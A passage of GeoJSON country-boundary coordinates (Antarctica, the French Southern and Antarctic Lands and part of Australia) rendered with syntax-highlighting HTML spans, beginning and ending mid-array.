class="hljs-selector-attr">[88.358411,-66.484261]</span>,<span class="hljs-selector-attr">[88.828408,-66.954568]</span>,<span class="hljs-selector-attr">[89.67063,-67.150474]</span>,<span class="hljs-selector-attr">[90.630365,-67.228867]</span>,<span class="hljs-selector-attr">[91.5901,-67.111303]</span>,<span class="hljs-selector-attr">[92.608539,-67.189696]</span>,<span class="hljs-selector-attr">[93.548637,-67.209282]</span>,<span class="hljs-selector-attr">[94.17542,-67.111303]</span>,<span class="hljs-selector-attr">[95.017591,-67.170111]</span>,<span class="hljs-selector-attr">[95.781472,-67.385653]</span>,<span class="hljs-selector-attr">[96.682399,-67.248504]</span>,<span class="hljs-selector-attr">[97.759646,-67.248504]</span>,<span class="hljs-selector-attr">[98.68021,-67.111303]</span>,<span class="hljs-selector-attr">[99.718182,-67.248504]</span>,<span class="hljs-selector-attr">[100.384188,-66.915346]</span>,<span class="hljs-selector-attr">[100.893356,-66.58224]</span>,<span class="hljs-selector-attr">[101.578896,-66.30789]</span>,<span class="hljs-selector-attr">[102.832411,-65.563284]</span>,<span class="hljs-selector-attr">[103.478676,-65.700485]</span>,<span class="hljs-selector-attr">[104.242557,-65.974783]</span>,<span class="hljs-selector-attr">[104.90846,-66.327527]</span>,<span class="hljs-selector-attr">[106.181561,-66.934931]</span>,<span class="hljs-selector-attr">[107.160881,-66.954568]</span>,<span class="hljs-selector-attr">[108.081393,-66.954568]</span>,<span class="hljs-selector-attr">[109.15864,-66.837004]</span>,<span class="hljs-selector-attr">[110.235835,-66.699804]</span>,<span class="hljs-selector-attr">[111.058472,-66.425505]</span>,<span class="hljs-selector-attr">[111.74396,-66.13157]</span>,<span class="hljs-selector-attr">[112.860378,-66.092347]</span>,<span class="hljs-selector-attr">[113.604673,-65.876805]</span>,<span class="hljs-selector-attr">[114.388088,-66.072762]</span>,<span class="hljs-selector-attr">[114.897308,-66.386283]</span>,<span class="hljs-selector-attr">[115.602381,-66.699804]</span>,<span class="hljs-selector-attr">[116.699161,-66.660633]</span>,<span class="hljs-selector-attr">[117.384701,-66.915346]</span>,<span class="hljs-selector-attr">[118.57946,-67.170111]</span>,<span class="hljs-selector-attr">[119.832924,-67.268089]</span>,<span class="hljs-selector-attr">[120.871,-67.189696]</span>,<span class="hljs-selector-attr">[121.654415,-66.876175]</span>,<span class="hljs-selector-attr">[122.320369,-66.562654]</span>,<span class="hljs-selector-attr">[123.221296,-66.484261]</span>,<span class="hljs-selector-attr">[124.122274,-66.621462]</span>,<span class="hljs-selector-attr">[125.160247,-66.719389]</span>,<span class="hljs-selector-attr">[126.100396,-66.562654]</span>,<span class="hljs-selector-attr">[127.001427,-66.562654]</span>,<span class="hljs-selector-attr">[127.882768,-66.660633]</span>,<span class="hljs-selector-attr">[128.80328,-66.758611]</span>,<span class="hljs-selector-attr">[129.704259,-66.58224]</span>,<span class="hljs-selector-attr">[130.781454,-66.425505]</span>,<span class="hljs-selector-attr">[131.799945,-66.386283]</span>,<span class="hljs-selector-attr">[132.935896,-66.386283]</span>,<span class="hljs-selector-attr">[133.85646,-66.288304]</span>,<span class="hljs-selector-attr">[134.757387,-66.209963]</span>,<span class="hljs-selector-attr">[135.031582,-65.72007]</span>,<span class="hljs-selector-attr">[135.070753,-65.308571]</span>,<span class="hljs-selector-attr">[135.697485,-65.582869]</span>,<span class="hljs-selector-attr">[135.873805,-66.033591]</span>,<span class="hljs-selector-attr">[136.206705,-66.44509]</span>,<span class="hljs-selector-attr">[136.618049,-66.778197]</span>,<span class="hljs-selector-attr">[137.460271,-66.954568]</span>,<span class="hljs-selector-attr">[138.596223,-66.895761]</span>,<span class="hljs-selector-attr">[139.908442,-66.876175]</span>,<span class="hljs-selector-attr">[140.809421,-66.817367]</span>,<span class="hljs-selector-attr">[142.121692,-66.817367]</span>,<span class="hljs-selector-attr">[143.061842,-66.797782]</span>,<span class="hljs-selector-attr">[144.374061,-66.837004]</span>,<span class="hljs-selector-attr">[145.490427,-66.915346]</span>,<span class="hljs-selector-attr">[146.195552,-67.228867]</span>,<span class="hljs-selector-attr">[145.999699,-67.601196]</span>,<span class="hljs-selector-attr">[146.646067,-67.895131]</span>,<span class="hljs-selector-attr">[147.723263,-68.130259]</span>,<span class="hljs-selector-attr">[148.839629,-68.385024]</span>,<span class="hljs-selector-attr">[150.132314,-68.561292]</span>,<span class="hljs-selector-attr">[151.483705,-68.71813]</span>,<span class="hljs-selector-attr">[152.502247,-68.874813]</span>,<span class="hljs-selector-attr">[153.638199,-68.894502]</span>,<span class="hljs-selector-attr">[154.284567,-68.561292]</span>,<span class="hljs-selector-attr">[155.165857,-68.835642]</span>,<span class="hljs-selector-attr">[155.92979,-69.149215]</span>,<span class="hljs-selector-attr">[156.811132,-69.384291]</span>,<span class="hljs-selector-attr">[158.025528,-69.482269]</span>,<span class="hljs-selector-attr">[159.181013,-69.599833]</span>,<span class="hljs-selector-attr">[159.670699,-69.991747]</span>,<span class="hljs-selector-attr">[160.80665,-70.226875]</span>,<span class="hljs-selector-attr">[161.570479,-70.579618]</span>,<span class="hljs-selector-attr">[162.686897,-70.736353]</span>,<span class="hljs-selector-attr">[163.842434,-70.716768]</span>,<span class="hljs-selector-attr">[164.919681,-70.775524]</span>,<span class="hljs-selector-attr">[166.11444,-70.755938]</span>,<span class="hljs-selector-attr">[167.309095,-70.834332]</span>,<span class="hljs-selector-attr">[168.425616,-70.971481]</span>,<span class="hljs-selector-attr">[169.463589,-71.20666]</span>,<span class="hljs-selector-attr">[170.501665,-71.402617]</span>,<span class="hljs-selector-attr">[171.20679,-71.696501]</span>,<span class="hljs-selector-attr">[171.089227,-72.088415]</span>,<span class="hljs-selector-attr">[170.560422,-72.441159]</span>,<span class="hljs-selector-attr">[170.109958,-72.891829]</span>,<span class="hljs-selector-attr">[169.75737,-73.24452]</span>,<span class="hljs-selector-attr">[169.287321,-73.65602]</span>,<span class="hljs-selector-attr">[167.975101,-73.812806]</span>,<span class="hljs-selector-attr">[167.387489,-74.165498]</span>,<span class="hljs-selector-attr">[166.094803,-74.38104]</span>,<span class="hljs-selector-attr">[165.644391,-74.772954]</span>,<span class="hljs-selector-attr">[164.958851,-75.145283]</span>,<span class="hljs-selector-attr">[164.234193,-75.458804]</span>,<span class="hljs-selector-attr">[163.822797,-75.870303]</span>,<span class="hljs-selector-attr">[163.568239,-76.24258]</span>,<span class="hljs-selector-attr">[163.47026,-76.693302]</span>,<span class="hljs-selector-attr">[163.489897,-77.065579]</span>,<span class="hljs-selector-attr">[164.057873,-77.457442]</span>,<span class="hljs-selector-attr">[164.273363,-77.82977]</span>,<span class="hljs-selector-attr">[164.743464,-78.182514]</span>,<span class="hljs-selector-attr">[166.604126,-78.319611]</span>,<span class="hljs-selector-attr">[166.995781,-78.750748]</span>,<span class="hljs-selector-attr">[165.193876,-78.907483]</span>,<span class="hljs-selector-attr">[163.666217,-79.123025]</span>,<span class="hljs-selector-attr">[161.766385,-79.162248]</span>,<span class="hljs-selector-attr">[160.924162,-79.730482]</span>,<span class="hljs-selector-attr">[160.747894,-80.200737]</span>,<span class="hljs-selector-attr">[160.316964,-80.573066]</span>,<span class="hljs-selector-attr">[159.788211,-80.945395]</span>,<span class="hljs-selector-attr">[161.120016,-81.278501]</span>,<span class="hljs-selector-attr">[161.629287,-81.690001]</span>,<span class="hljs-selector-attr">[162.490992,-82.062278]</span>,<span class="hljs-selector-attr">[163.705336,-82.395435]</span>,<span class="hljs-selector-attr">[165.095949,-82.708956]</span>,<span class="hljs-selector-attr">[166.604126,-83.022477]</span>,<span class="hljs-selector-attr">[168.895665,-83.335998]</span>,<span class="hljs-selector-attr">[169.404782,-83.825891]</span>,<span class="hljs-selector-attr">[172.283934,-84.041433]</span>,<span class="hljs-selector-attr">[172.477049,-84.117914]</span>,<span class="hljs-selector-attr">[173.224083,-84.41371]</span>,<span class="hljs-selector-attr">[175.985672,-84.158997]</span>,<span class="hljs-selector-attr">[178.277212,-84.472518]</span>,<span class="hljs-selector-attr">[180,-84.71338]</span>,<span class="hljs-selector-attr">[-179.942499,-84.721443]</span>,<span class="hljs-selector-attr">[-179.058677,-84.139412]</span>,<span class="hljs-selector-attr">[-177.256772,-84.452933]</span>,<span class="hljs-selector-attr">[-177.140807,-84.417941]</span>,<span class="hljs-selector-attr">[-176.084673,-84.099259]</span>,<span class="hljs-selector-attr">[-175.947235,-84.110449]</span>,<span class="hljs-selector-attr">[-175.829882,-84.117914]</span>,<span class="hljs-selector-attr">[-174.382503,-84.534323]</span>,<span class="hljs-selector-attr">[-173.116559,-84.117914]</span>,<span class="hljs-selector-attr">[-172.889106,-84.061019]</span>,<span class="hljs-selector-attr">[-169.951223,-83.884647]</span>,<span class="hljs-selector-attr">[-168.999989,-84.117914]</span>,<span class="hljs-selector-attr">[-168.530199,-84.23739]</span>,<span class="hljs-selector-attr">[-167.022099,-84.570497]</span>,<span class="hljs-selector-attr">[-164.182144,-84.82521]</span>,<span class="hljs-selector-attr">[-161.929775,-85.138731]</span>,<span class="hljs-selector-attr">[-158.07138,-85.37391]</span>,<span class="hljs-selector-attr">[-155.192253,-85.09956]</span>,<span class="hljs-selector-attr">[-150.942099,-85.295517]</span>,<span class="hljs-selector-attr">[-148.533073,-85.609038]</span>,<span class="hljs-selector-attr">[-145.888918,-85.315102]</span>,<span class="hljs-selector-attr">[-143.107718,-85.040752]</span>,<span class="hljs-selector-attr">[-142.892279,-84.570497]</span>,<span class="hljs-selector-attr">[-146.829068,-84.531274]</span>,<span class="hljs-selector-attr">[-150.060732,-84.296146]</span>,<span class="hljs-selector-attr">[-150.902928,-83.904232]</span>,<span class="hljs-selector-attr">[-153.586201,-83.68869]</span>,<span class="hljs-selector-attr">[-153.409907,-83.23802]</span>,<span class="hljs-selector-attr">[-153.037759,-82.82652]</span>,<span class="hljs-selector-attr">[-152.665637,-82.454192]</span>,<span class="hljs-selector-attr">[-152.861517,-82.042692]</span>,<span class="hljs-selector-attr">[-154.526299,-81.768394]</span>,<span class="hljs-selector-attr">[-155.29018,-81.41565]</span>,<span class="hljs-selector-attr">[-156.83745,-81.102129]</span>,<span class="hljs-selector-attr">[-154.408787,-81.160937]</span>,<span class="hljs-selector-attr">[-152.097662,-81.004151]</span>,<span class="hljs-selector-attr">[-150.648293,-81.337309]</span>,<span class="hljs-selector-attr">[-148.865998,-81.043373]</span>,<span class="hljs-selector-attr">[-147.22075,-80.671045]</span>,<span class="hljs-selector-attr">[-146.417749,-80.337938]</span>,<span class="hljs-selector-attr">[-146.770286,-79.926439]</span>,<span class="hljs-selector-attr">[-148.062947,-79.652089]</span>,<span class="hljs-selector-attr">[-149.531901,-79.358205]</span>,<span class="hljs-selector-attr">[-151.588416,-79.299397]</span>,<span class="hljs-selector-attr">[-153.390322,-79.162248]</span>,<span class="hljs-selector-attr">[-155.329376,-79.064269]</span>,<span class="hljs-selector-attr">[-155.975668,-78.69194]</span>,<span class="hljs-selector-attr">[-157.268302,-78.378419]</span>,<span class="hljs-selector-attr">[-158.051768,-78.025676]</span>,<span class="hljs-selector-attr">[-158.365134,-76.889207]</span>,<span class="hljs-selector-attr">[-157.875474,-76.987238]</span>,<span class="hljs-selector-attr">[-156.974573,-77.300759]</span>,<span class="hljs-selector-attr">[-155.329376,-77.202728]</span>,<span class="hljs-selector-attr">[-153.742832,-77.065579]</span>,<span class="hljs-selector-attr">[-152.920247,-77.496664]</span>,<span class="hljs-selector-attr">[-151.33378,-77.398737]</span>,<span class="hljs-selector-attr">[-150.00195,-77.183143]</span>,<span class="hljs-selector-attr">[-148.748486,-76.908845]</span>,<span class="hljs-selector-attr">[-147.612483,-76.575738]</span>,<span class="hljs-selector-attr">[-146.104409,-76.47776]</span>,<span class="hljs-selector-attr">[-146.143528,-76.105431]</span>,<span class="hljs-selector-attr">[-146.496091,-75.733154]</span>,<span class="hljs-selector-attr">[-146.20231,-75.380411]</span>,<span class="hljs-selector-attr">[-144.909624,-75.204039]</span>,<span class="hljs-selector-attr">[-144.322037,-75.537197]</span>,<span class="hljs-selector-attr">[-142.794353,-75.34124]</span>,<span class="hljs-selector-attr">[-141.638764,-75.086475]</span>,<span class="hljs-selector-attr">[-140.209007,-75.06689]</span>,<span class="hljs-selector-attr">[-138.85759,-74.968911]</span>,<span class="hljs-selector-attr">[-137.5062,-74.733783]</span>,<span class="hljs-selector-attr">[-136.428901,-74.518241]</span>,<span class="hljs-selector-attr">[-135.214583,-74.302699]</span>,<span class="hljs-selector-attr">[-134.431194,-74.361455]</span>,<span class="hljs-selector-attr">[-133.745654,-74.439848]</span>,<span class="hljs-selector-attr">[-132.257168,-74.302699]</span>,<span class="hljs-selector-attr">[-130.925311,-74.479019]</span>,<span class="hljs-selector-attr">[-129.554284,-74.459433]</span>,<span class="hljs-selector-attr">[-128.242038,-74.322284]</span>,<span class="hljs-selector-attr">[-126.890622,-74.420263]</span>,<span class="hljs-selector-attr">[-125.402082,-74.518241]</span>,<span class="hljs-selector-attr">[-124.011496,-74.479019]</span>,<span class="hljs-selector-attr">[-122.562152,-74.498604]</span>,<span class="hljs-selector-attr">[-121.073613,-74.518241]</span>,<span class="hljs-selector-attr">[-119.70256,-74.479019]</span>,<span class="hljs-selector-attr">[-118.684145,-74.185083]</span>,<span class="hljs-selector-attr">[-117.469801,-74.028348]</span>,<span class="hljs-selector-attr">[-116.216312,-74.243891]</span>,<span class="hljs-selector-attr">[-115.021552,-74.067519]</span>,<span class="hljs-selector-attr">[-113.944331,-73.714828]</span>,<span class="hljs-selector-attr">[-113.297988,-74.028348]</span>,<span class="hljs-selector-attr">[-112.945452,-74.38104]</span>,<span class="hljs-selector-attr">[-112.299083,-74.714198]</span>,<span class="hljs-selector-attr">[-111.261059,-74.420263]</span>,<span class="hljs-selector-attr">[-110.066325,-74.79254]</span>,<span class="hljs-selector-attr">[-108.714909,-74.910103]</span>,<span class="hljs-selector-attr">[-107.559346,-75.184454]</span>,<span class="hljs-selector-attr">[-106.149148,-75.125698]</span>,<span class="hljs-selector-attr">[-104.876074,-74.949326]</span>,<span class="hljs-selector-attr">[-103.367949,-74.988497]</span>,<span class="hljs-selector-attr">[-102.016507,-75.125698]</span>,<span class="hljs-selector-attr">[-100.645531,-75.302018]</span>,<span class="hljs-selector-attr">[-100.1167,-74.870933]</span>,<span class="hljs-selector-attr">[-100.763043,-74.537826]</span>,<span class="hljs-selector-attr">[-101.252703,-74.185083]</span>,<span class="hljs-selector-attr">[-102.545337,-74.106742]</span>,<span class="hljs-selector-attr">[-103.113313,-73.734413]</span>,<span class="hljs-selector-attr">[-103.328752,-73.362084]</span>,<span class="hljs-selector-attr">[-103.681289,-72.61753]</span>,<span class="hljs-selector-attr">[-102.917485,-72.754679]</span>,<span class="hljs-selector-attr">[-101.60524,-72.813436]</span>,<span class="hljs-selector-attr">[-100.312528,-72.754679]</span>,<span class="hljs-selector-attr">[-99.13738,-72.911414]</span>,<span class="hljs-selector-attr">[-98.118889,-73.20535]</span>,<span class="hljs-selector-attr">[-97.688037,-73.558041]</span>,<span class="hljs-selector-attr">[-96.336595,-73.616849]</span>,<span class="hljs-selector-attr">[-95.043961,-73.4797]</span>,<span class="hljs-selector-attr">[-93.672907,-73.283743]</span>,<span class="hljs-selector-attr">[-92.439003,-73.166179]</span>,<span class="hljs-selector-attr">[-91.420564,-73.401307]</span>,<span class="hljs-selector-attr">[-90.088733,-73.322914]</span>,<span class="hljs-selector-attr">[-89.226951,-72.558722]</span>,<span class="hljs-selector-attr">[-88.423951,-73.009393]</span>,<span class="hljs-selector-attr">[-87.268337,-73.185764]</span>,<span class="hljs-selector-attr">[-86.014822,-73.087786]</span>,<span class="hljs-selector-attr">[-85.192236,-73.4797]</span>,<span class="hljs-selector-attr">[-83.879991,-73.518871]</span>,<span class="hljs-selector-attr">[-82.665646,-73.636434]</span>,<span class="hljs-selector-attr">[-81.470913,-73.851977]</span>,<span class="hljs-selector-attr">[-80.687447,-73.4797]</span>,<span class="hljs-selector-attr">[-80.295791,-73.126956]</span>,<span class="hljs-selector-attr">[-79.296886,-73.518871]</span>,<span class="hljs-selector-attr">[-77.925858,-73.420892]</span>,<span class="hljs-selector-attr">[-76.907367,-73.636434]</span>,<span class="hljs-selector-attr">[-76.221879,-73.969541]</span>,<span class="hljs-selector-attr">[-74.890049,-73.871614]</span>,<span class="hljs-selector-attr">[-73.852024,-73.65602]</span>,<span class="hljs-selector-attr">[-72.833533,-73.401307]</span>,<span class="hljs-selector-attr">[-71.619215,-73.264157]</span>,<span class="hljs-selector-attr">[-70.209042,-73.146542]</span>,<span class="hljs-selector-attr">[-68.935916,-73.009393]</span>,<span class="hljs-selector-attr">[-67.956622,-72.79385]</span>,<span class="hljs-selector-attr">[-67.369061,-72.480329]</span>,<span class="hljs-selector-attr">[-67.134036,-72.049244]</span>,<span class="hljs-selector-attr">[-67.251548,-71.637745]</span>,<span class="hljs-selector-attr">[-67.56494,-71.245831]</span>,<span class="hljs-selector-attr">[-67.917477,-70.853917]</span>,<span class="hljs-selector-attr">[-68.230843,-70.462055]</span>,<span class="hljs-selector-attr">[-68.485452,-70.109311]</span>,<span class="hljs-selector-attr">[-68.544209,-69.717397]</span>,<span class="hljs-selector-attr">[-68.446282,-69.325535]</span>,<span class="hljs-selector-attr">[-67.976233,-68.953206]</span>,<span class="hljs-selector-attr">[-67.5845,-68.541707]</span>,<span class="hljs-selector-attr">[-67.427843,-68.149844]</span>,<span class="hljs-selector-attr">[-67.62367,-67.718759]</span>,<span class="hljs-selector-attr">[-67.741183,-67.326845]</span>,<span class="hljs-selector-attr">[-67.251548,-66.876175]</span>,<span class="hljs-selector-attr">[-66.703184,-66.58224]</span>,<span class="hljs-selector-attr">[-66.056815,-66.209963]</span>,<span class="hljs-selector-attr">[-65.371327,-65.89639]</span>,<span class="hljs-selector-attr">[-64.568276,-65.602506]</span>,<span class="hljs-selector-attr">[-64.176542,-65.171423]</span>,<span class="hljs-selector-attr">[-63.628152,-64.897073]</span>,<span class="hljs-selector-attr">[-63.001394,-64.642308]</span>,<span class="hljs-selector-attr">[-62.041686,-64.583552]</span>,<span class="hljs-selector-attr">[-61.414928,-64.270031]</span>,<span class="hljs-selector-attr">[-60.709855,-64.074074]</span>,<span class="hljs-selector-attr">[-59.887269,-63.95651]</span>,<span class="hljs-selector-attr">[-59.162585,-63.701745]</span>,<span class="hljs-selector-attr">[-58.594557,-63.388224]</span>,<span class="hljs-selector-attr">[-57.811143,-63.27066]</span>,<span class="hljs-selector-attr">[-57.223582,-63.525425]</span>,<span class="hljs-selector-attr">[-57.59573,-63.858532]</span>,<span class="hljs-selector-attr">[-58.614143,-64.152467]</span>]]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">ATF</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">French</span> <span class="hljs-selector-tag">Southern</span> <span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">Antarctic</span> <span class="hljs-selector-tag">Lands</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Polygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[68.935,-48.625]</span>,<span class="hljs-selector-attr">[69.58,-48.94]</span>,<span class="hljs-selector-attr">[70.525,-49.065]</span>,<span class="hljs-selector-attr">[70.56,-49.255]</span>,<span class="hljs-selector-attr">[70.28,-49.71]</span>,<span class="hljs-selector-attr">[68.745,-49.775]</span>,<span class="hljs-selector-attr">[68.72,-49.2425]</span>,<span class="hljs-selector-attr">[68.8675,-48.83]</span>,<span class="hljs-selector-attr">[68.935,-48.625]</span>]]}},
{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">Feature</span>","<span class="hljs-selector-tag">id</span>":"<span class="hljs-selector-tag">AUS</span>","<span class="hljs-selector-tag">properties</span>":{"<span class="hljs-selector-tag">name</span>":"<span class="hljs-selector-tag">Australia</span>"},"<span class="hljs-selector-tag">geometry</span>":{"<span class="hljs-selector-tag">type</span>":"<span class="hljs-selector-tag">MultiPolygon</span>","<span class="hljs-selector-tag">coordinates</span>":<span class="hljs-selector-attr">[[[[145.397978,-40.792549]</span>,<span class="hljs-selector-attr">[146.364121,-41.137695]</span>,<span class="hljs-selector-attr">[146.908584,-41.000546]</span>,<span class="hljs-selector-attr">[147.689259,-40.808258]</span>,<span class="hljs-selector-attr">[148.289068,-40.875438]</span>,<span class="hljs-selector-attr">[148.359865,-42.062445]</span>,<span class="hljs-selector-attr">[148.017301,-42.407024]</span>,<span class="hljs-selector-attr">[147.914052,-43.211522]</span>,<span class="hljs-selector-attr">[147.564564,-42.937689]</span>,<span class="hljs-selector-attr">[146.870343,-43.634597]</span>,<span class="hljs-selector-attr">[146.663327,-43.580854]</span>,<span class="hljs-selector-attr">[146.048378,-43.549745]</span>,<span class="hljs-selector-attr">[145.43193,-42.693776]</span>,<span class="hljs-selector-attr">[145.29509,-42.03361]</span>,<span class="hljs-selector-attr">[144.718071,-41.162552]</span>,<span class="hljs-selector-attr">[144.743755,-40.703975]</span>,<span class="hljs-selector-attr">[145.397978,-40.792549]</span>]],<span class="hljs-selector-attr">[[[143.561811,-13.763656]</span>,<span class="hljs-selector-attr">[143.922099,-14.548311]</span>,<span class="hljs-selector-attr">[144.563714,-14.171176]</span>,<span class="hljs-selector-attr">[144.894908,-14.594458]</span>,<span class="hljs-selector-attr">[145.374724,-14.984976]</span>,<span class="hljs-selector-attr">[145.271991,-15.428205]</span>,<span class="hljs-selector-attr">[145.48526,-16.285672]</span>,<span class="hljs-selector-attr">[145.637033,-16.784918]</span>,<span class="hljs-selector-attr">[145.888904,-16.906926]</span>,<span class="hljs-selector-attr">[146.160309,-17.761655]</span>,<span class="hljs-selector-attr">[146.063674,-18.280073]</span>,<span class="hljs-selector-attr">[146.387478,-18.958274]</span>,<span class="hljs-selector-attr">[147.471082,-19.480723]</span>,<span class="hljs-selector-attr">[148.177602,-19.955939]</span>,<span class="hljs-selector-attr">[148.848414,-20.39121]</span>,<span class="hljs-selector-attr">[148.717465,-20.633469]</span>,<span class="hljs-selector-attr">[149.28942,-21.260511]</span>,<span class="hljs-selector-attr">[149.678337,-22.342512]</span>,<span class="hljs-selector-attr">[150.077382,-22.122784]</span>,<span class="hljs-selector-attr">[150.482939,-22.556142]</span>,<span class="hljs-selector-attr">[150.727265,-22.402405]</span>,<span class="hljs-selector-attr">[150.899554,-23.462237]</span>,<span class="hljs-selector-attr">[151.609175,-24.076256]</span>,<span class="hljs-selector-attr">[152.07354,-24.457887]</span>,<span class="hljs-selector-attr">[152.855197,-25.267501]</span>,<span class="hljs-selector-attr">[153.136162,-26.071173]</span>,<span class="hljs-selector-attr">[153.161949,-26.641319]</span>,<span class="hljs-selector-attr">[153.092909,-27.2603]</span>,<span class="hljs-selector-attr">[153.569469,-28.110067]</span>,<span class="hljs-selector-attr">[153.512108,-28.995077]</span>,<span class="hljs-selector-attr">[153.339095,-29.458202]</span>,<span class="hljs-selector-attr">[153.069241,-30.35024]</span>,<span class="hljs-selector-attr">[153.089602,-30.923642]</span>,<span class="hljs-selector-attr">[152.891578,-31.640446]</span>,<span class="hljs-selector-attr">[152.450002,-32.550003]</span>,<span class="hljs-selector-attr">[151.709117,-33.041342]</span>,<span class="hljs-selector-attr">[151.343972,-33.816023]</span>,<span class="hljs-selector-attr">[151.010555,-34.31036]</span>,<span class="hljs-selector-attr">[150.714139,-35.17346]</span>,<span class="hljs-selector-attr">[150.32822,-35.671879]</span>,<span class="hljs-selector-attr">[150.075212,-36.420206]</span>,<span class="hljs-selector-attr">[149.946124,-37.109052]</span>,<span class="hljs-selector-attr">[149.997284,-37.425261]</span>,<span class="hljs-selector-attr">[149.423882,-37.772681]</span>,<span class="hljs-selector-attr">[148.304622,-37.809061]</span>,<span class="hljs-selector-attr">[147.381733,-38.219217]</span>,<span class="hljs-selector-attr">[146.922123,-38.606532]</span>,<span class="hljs-selector-attr">[146.317922,-39.035757]</span>,<span class="hljs-selector-attr">[145.489652,-38.593768]</span>,<span class="hljs-selector-attr">[144.876976,-38.417448]</span>,<span class="hljs-selector-attr">[145.032212,-37.896188]</span>,<span class="hljs-selector-attr">[144.485682,-38.085324]</span>,<span class="hljs-selector-attr">[143.609974,-38.809465]</span>,<span class="hljs-selector-attr">[142.745427,-38.538268]</span>,<span class="hljs-selector-attr">[142.17833,-38.380034]</span>,<span class="hljs-selector-attr">[141.606582,-38.308514]</span>,<span class="hljs-selector-attr">[140.638579,-38.019333]</span>,<span class="hljs-selector-attr">[139.992158,-37.402936]</span>,<span class="hljs-selector-attr">[139.806588,-36.643603]</span>,<span class="hljs-selector-attr">[139.574148,-36.138362]</span>,<span class="hljs-selector-attr">[139.082808,-35.732754]</span>,<span class="hljs-selector-attr">[138.120748,-35.612296]</span>,<span class="hljs-selector-attr">[138.449462,-35.127261]</span>,<span class="hljs-selector-attr">[138.207564,-34.384723]</span>,<span class="hljs-selector-attr">[137.71917,-35.076825]</span>,<span class="hljs-selector-attr">[136.829406,-35.260535]</span>,<span class="hljs-selector-attr">[137.352371,-34.707339]</span>,<span class="hljs-selector-attr">[137.503886,-34.130268]</span>,<span class="hljs-selector-attr">[137.890116,-33.640479]</span>,<span class="hljs-selector-attr">[137.810328,-32.900007]</span>,<span class="hljs-selector-attr">[136.996837,-33.752771]</span>,<span class="hljs-selector-attr">[136.372069,-34.094766]</span>,<span class="hljs-selector-attr">[135.989043,-34.890118]</span>,<span class="hljs-selector-attr">[135.208213,-34.47867]</span>,<span class="hljs-selector-attr">[135.239218,-33.947953]</span>,<span class="hljs-selector-attr">[134.613417,-33.222778]</span>,<span class="hljs-selector-attr">[134.085904,-32.848072]</span>,<span class="hljs-selector-attr">[134.273903,-32.617234]</span>,<span class="hljs-selector-attr">[132.990777,-32.011224]</span>,<span class="hljs-selector-attr">[132.288081,-31.982647]</span>,<span class="hljs-selector-attr">[131.326331,-31.495803]</span>,<span class="hljs-selector-attr">[129.535794,-31.590423]</span>,<span class="hljs-selector-attr">[128.240938,-31.948489]</span>,<span class="hljs-selector-attr">[127.102867,-32.282267]</span>,<span class="hljs-selector-attr">[126.148714,-32.215966]</span>,<span class="hljs-selector-attr">[125.088623,-32.728751]</span>,<span class="hljs-selector-attr">[124.221648,-32.959487]</span>,<span class="hljs-selector-attr">[124.028947,-33.483847]</span>,<span class="hljs-selector-attr">[123.659667,-33.890179]</span>,<span class="hljs-selector-attr">[122.811036,-33.914467]</span>,<span class="hljs-selector-attr">[122.183064,-34.003402]</span>,<span class="hljs-selector-attr">[121.299191,-33.821036]</span>,<span class="hljs-selector-attr">[120.580268,-33.930177]</span>,<span class="hljs-selector-attr">[119.893695,-33.976065]</span>,<span class="hljs-selector-attr">[119.298899,-34.509366]</span>,<span class="hljs-selector-attr">[119.007341,-34.464149]</span>,<span class="hljs-selector-attr">[118.505718,-34.746819]</span>,<span class="hljs-selector-attr">[118.024972,-35.064733]</span>,<span class="hljs-selector-attr">[117.295507,-35.025459]</span>,<span class="hljs-selector-attr">[116.625109,-35.025097]</span>,<span class="hljs-selector-attr">[115.564347,-34.386428]</span>,<span class="hljs-selector-attr">[115.026809,-34.196517]</span>,<span class="hljs-selector-attr">[115.048616,-33.623425]</span>,<span class="hljs-selector-attr">[115.545123,-33.487258]</span>,<span class="hljs-selector-attr">[115.714674,-33.259572]</span>,<span class="hljs-selector-attr">[115.679379,-32.900369]</span>,<span class="hljs-selector-attr">[115.801645,-32.205062]</span>,<span class="hljs-selector-attr">[115.689611,-31.612437]</span>,<span class="hljs-selector-attr">[115.160909,-30.601594]</span>,<span class="hljs-selector-attr">[114.997043,-30.030725]</span>,<span class="hljs-selector-attr">[115.040038,-29.461095]</span>,<span class="hljs-selector-attr">[114.641974,-28.810231]</span>,<span class="hljs-selector-attr">[114.616498,-28.516399]</span>,<span class="hljs-selector-attr">[114.173579,-28.118077]</span>,<span class="hljs-selector-attr">[114.048884,-27.334765]</span>,<span class="hljs-selector-attr">[113.477498,-26.543134]</span>,<span class="hljs-selector-attr">[113.338953,-26.116545]</span>,<span class="hljs-selector-attr">[113.778358,-26.549025]</span>,<span class="hljs-selector-attr">[113.440962,-25.621278]</span>,<span class="hljs-selector-attr">[113.936901,-25.911235]</span>,<span class="hljs-selector-attr">[114.232852,-26.298446]</span>,<span class="hljs-selector-attr">[114.216161,-25.786281]</span>,<span class="hljs-selector-attr">[113.721255,-24.998939]</span>,<span class="hljs-selector-attr">[113.625344,-24.683971]</span>,<span class="hljs-selector-attr">[113.393523,-24.384764]</span>,<span class="hljs-selector-attr">[113.502044,-23.80635]</span>,<span class="hljs-selector-attr">[113.706993,-23.560215]</span>,<span class="hljs-selector-attr">[113.843418,-23.059987]</span>,<span class="hljs-selector-attr">[113.736552,-22.475475]</span>,<span class="hljs-selector-attr">[114.149756,-21.755881]</span>,<span class="hljs-selector-attr">[114.225307,-22.517488]</span>,<span class="hljs-selector-attr">[114.647762,-21.82952]</span>,<span class="hljs-selector-attr">[115.460167,-21.495173]</span>,<span class="hljs-selector-attr">[115.947373,-21.068688]</span>,<span class="hljs-selector-attr">[116.711615,-20.701682]</span>,<span class="hljs-selector-attr">[117.166316,-20.623599]</span>,<span class="hljs-selector-attr">[117.441545,-20.746899]</span>,<span class="hljs-selector-attr">[118.229559,-20.374208]</span>,<span class="hljs-selector-attr">[118.836085,-20.263311]</span>,<span class="hljs-selector-attr">[118.987807,-20.044203]</span>,<span class="hljs-selector-attr">[119.252494,-19.952942]</span>,<span 